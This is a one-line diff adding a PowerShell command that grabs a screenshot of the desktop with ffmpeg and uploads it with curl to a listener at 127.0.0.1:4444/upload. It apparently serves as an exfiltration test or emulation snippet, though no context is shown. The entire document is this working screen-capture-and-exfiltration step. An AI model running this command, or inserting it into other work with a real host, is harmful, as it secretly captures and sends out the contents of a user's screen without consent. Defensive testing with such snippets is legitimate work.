@@ -1,0 +1,1 @@
+$foofile="out.png"; ffmpeg -y -f gdigrab -i desktop -vframes 1 $foofile; try { curl.exe -X POST -F "file=@$foofile" 127.0.0.1:4444/upload } catch { Write-Output "Error, file was not sent" }
